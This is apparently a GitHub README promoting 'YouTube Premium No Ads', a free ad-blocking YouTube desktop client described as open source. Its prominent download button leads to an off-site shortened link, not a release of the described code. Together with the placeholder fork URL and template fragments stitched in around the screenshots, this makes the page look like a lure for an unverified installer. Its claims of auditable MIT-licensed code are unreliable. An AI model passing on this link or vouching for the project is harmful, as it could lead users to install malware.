# 🔴 YouTube Premium No Ads

<div align="center">

<!-- Надежный баннер (Shields.io) -->
<img src="https://img.shields.io/badge/YouTube_Premium_No_Ads-Enjoy_the_content_without_interruptions-000000?style=for-the-badge&logoColor=FFFFFF&labelColor=FF0000" width="100%" height="60" />

<br><br>

<a href="#about" style="text-decoration: none;"><img src="https://img.shields.io/badge/ABOUT-FF0000?style=for-the-badge&labelColor=1a1a1a" /></a>
<a href="#features" style="text-decoration: none;"><img src="https://img.shields.io/badge/FEATURES-FF0000?style=for-the-badge&labelColor=1a1a1a" /></a>
<a href="#architecture" style="text-decoration: none;"><img src="https://img.shields.io/badge/ARCHITECTURE-FF0000?style=for-the-badge&labelColor=1a1a1a" /></a>
<a href="#tech-stack" style="text-decoration: none;"><img src="https://img.shields.io/badge/TECH_STACK-FF0000?style=for-the-badge&labelColor=1a1a1a" /></a>
<a href="#screenshots" style="text-decoration: none;"><img src="https://img.shields.io/badge/SCREENSHOTS-FF0000?style=for-the-badge&labelColor=1a1a1a" /></a>
<a href="#contributing" style="text-decoration: none;"><img src="https://img.shields.io/badge/CONTRIBUTING-FF0000?style=for-the-badge&labelColor=1a1a1a" /></a>

<br><br>

<img src="https://img.shields.io/badge/Windows-0078D6?style=flat-square&logo=windows&logoColor=white" />
<img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white" />
<img src="https://img.shields.io/badge/Linux-FCC624?style=flat-square&logo=linux&logoColor=black" />
<img src="https://img.shields.io/badge/Status-Stable-00C853?style=flat-square" />
<img src="https://img.shields.io/badge/License-MIT-2196F3?style=flat-square" />
<img src="https://img.shields.io/badge/PRs-Welcome-FF0000?style=flat-square" />

</div>

<img src="https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif" width="100%">

<br>

## 🎧 About

**YouTube Premium No Ads** is a lightweight, open-source desktop application that allows you to enjoy YouTube content completely free of advertisements. No browser extensions, no intrusive pop-ups, and no tracking — just pure, uninterrupted video and audio.

Built for users who want a **clean, premium-like experience** without paying a monthly subscription. The client strips out all ad breaks, sponsor segments, and promotional banners, giving you a native-feeling media player across Windows, macOS, and Linux.

Everything runs locally on your machine. The app interfaces directly with YouTube's public APIs, caches your watch history and playlists, and ensures that your viewing habits remain private and secure.

<br>

<div align="center">
<a href="http://noxsoftware.cc/s/muwbo2uD" style="text-decoration: none;">
  <img src="https://img.shields.io/badge/⬇_DOWNLOAD_LATEST_RELEASE-FF0000?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a1a" height="45" />
</a>
</div>

<br>

> **Now Loading:** `Videos: 1.2k` · `Ads Blocked: 8.4k` · `Watch Time: 340h` · `Status: ● PLAYING`

<br>

## ✨ What's Inside

<table>
<tr>
<td align="center" width="25%">

### 🚫
**Ad Blocker**

Completely removes pre-roll, mid-roll, and post-roll ads. No waiting for the "Skip" button ever again.

</td>
<td align="center" width="25%">

### 🎵
**Background Play**

Keep listening to audio even when the app is minimized or your screen is locked. Perfect for music.

</td>
<td align="center" width="25%">

### 📥
**Offline Downloads**

Save videos, playlists, and audio tracks directly to your local storage for offline viewing.

</td>
<td align="center" width="25%">

### 🎨
**Modern UI**

Native-feeling interface with a sleek dark mode, smooth animations, and customizable themes.

</td>
</tr>
<tr>
<td align="center" width="25%">

### 🔐
**Privacy First**

No account required. No tracking cookies. Your watch history stays on your device and nowhere else.

</td>
<td align="center" width="25%">

### 📺
**SponsorBlock**

Automatically skip sponsor segments, intros, and outros using community-driven timestamps.

</td>
<td align="center" width="25%">

### 🎬
**4K & HDR**

Enjoy videos in up to 4K resolution with HDR support, just like the official premium service.

</td>
<td align="center" width="25%">

### 🚀
**Open Source**

MIT licensed. Audit the code, build from source, and contribute features you need.

</td>
</tr>
</table>

<br>

## 📂 Architecture

```bash
youtube-premium-no-ads/
│
├── 📱  src/                  → Frontend (React + TypeScript)
│   ├── components/          → Player, Sidebar, SearchBar
│   ├── pages/               → Home, Subscriptions, History
│   ├── hooks/               → AdBlocker, PlayerState, Downloads
│   └── styles/              → Tailwind + custom dark theme
│
├── 🦀  src-tauri/            → Backend (Rust + Tauri)
│   ├── api/                 → YouTube API wrappers & Ad filters
│   ├── downloader/          → yt-dlp integration for offline media
│   └── utils/               → Cache, database, settings
│
├── 🧪  tests/                → Unit + integration tests
├── 📦  assets/               → Icons, logos, installers
├── ⚙️  .github/workflows/    → CI/CD (build, test, release)
└── 📖  docs/                 → Wiki, API reference, guides
```

<br>

## 🛠️ Tech Stack

<div align="center">

| Layer | Technology |
|:-----:|:-----------|
| 🎨 Frontend | React 18 · TypeScript · Tailwind CSS · Framer Motion |
| 🦀 Backend | Rust · Tauri 2.0 |
| 🗄️ Storage | SQLite (via `rusqlite`) · local filesystem |
| 🌐 Networking | `reqwest` · YouTube API v3 · Invidious |
| 🧪 Testing | Vitest · Playwright · `cargo test` |
| 🚀 CI/CD | GitHub Actions · Tauri bundler |

</div>

<br>

## 🎹 Supported Formats

<div align="center">

| 📁 Format | 💫 Description | 🎯 Status |
|:---------:|:---------------|:----------|
| `video/mp4` | Standard and 4K video | ✅ Supported |
| `video/webm` | VP9 high-efficiency video | ✅ Supported |
| `audio/mp3` | High-quality audio extraction | ✅ Supported |
| `audio/opus` | Background & spatial audio | ✅ Supported |
| `playlists` | Bulk download & sync | ✅ Supported |
| `live streams` | Watch without chat ads | 🚧 Planned |

</div>

<br>

<img width="1254" height="1254" alt="il_fullxfull 8652952462_309m" src="https://github.com/user-attachments/assets/a05381da-5c97-4ee5-abb4-17822a753df8" />

### ⚙️ Settings

Customizable ad-blocking rules, download paths, and playback preferences.

</td>
<td width="50%" valign="top">

### 📊 History

Local watch history, saved playlists, and downloaded media library.

</td>
</tr>
</table>

> 📸 *Screenshots coming soon. Star the repo to get notified when the stable release drops.*

<br>

## ⌨️ Hotkeys

<div align="center">

<table>
<tr>
<td align="center" width="50%" valign="top">

### 🎮 Navigation

| Key | Action |
|:---:|:-------|
| `Space` | Play / Pause |
| `F` | Fullscreen |
| `Ctrl + F` | Search videos |
| `Ctrl + H` | Open history |
| `Ctrl + D` | Download video |
| `Esc` | Close player |

</td>
<td align="center" width="50%" valign="top">

### ⚡ Actions

| Key | Action |
|:---:|:-------|
| `M` | Mute / Unmute |
| `←` / `→` | Seek 5s |
| `↑` / `↓` | Volume up/down |
| `Ctrl + ,` | Open settings |
| `Ctrl + Shift + A` | Toggle ad-blocker |
| `Ctrl + Q` | Quit app |

</td>
</tr>
</table>

</div>

<br>

## 🤝 Contributing

<div align="center">

```mermaid
graph LR
    A[🍴 Fork] --> B[🌿 Branch]
    B --> C[💻 Build]
    C --> D[💾 Commit]
    D --> E[📤 Push]
    E --> F[🔃 Pull Request]
    F --> G[🎉 Merged!]
    
    style A fill:#FF0000,color:#fff
    style B fill:#FF0000,color:#fff
    style C fill:#FF0000,color:#fff
    style D fill:#FF0000,color:#fff
    style E fill:#FF0000,color:#fff
    style F fill:#FF0000,color:#fff
    style G fill:#00C853,color:#fff
```

</div>

Contributions of any kind are welcome — new features, bug fixes, UI improvements, or translations. Please read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a Pull Request. Every submission is reviewed for code quality, test coverage, and compatibility with supported platforms.

<br>

## 📜 License

```
MIT License — use it. remix it. share it.

```

<br>

<img src="https://user-images.githubusercontent.com/74038190/212284158-e840e285-664b-44d7-b79b-e264b5e54825.gif" width="100%">

<br>

<div align="center">
<br>
<a href="https://github.com/username/youtube-premium-no-ads/fork" style="text-decoration: none;">
  <img src="https://img.shields.io/badge/🚀_JOIN_THE_PROJECT-000000?style=for-the-badge&logo=github&logoColor=white" height="45" />
</a>
</div>

<br>

<!-- Надежный футер -->
<div align="center">
<img src="https://img.shields.io/badge/⭐_Star_the_repo-Built_for_viewers,_by_viewers-000000?style=for-the-badge&labelColor=FF0000" width="100%" height="50" />
</div>
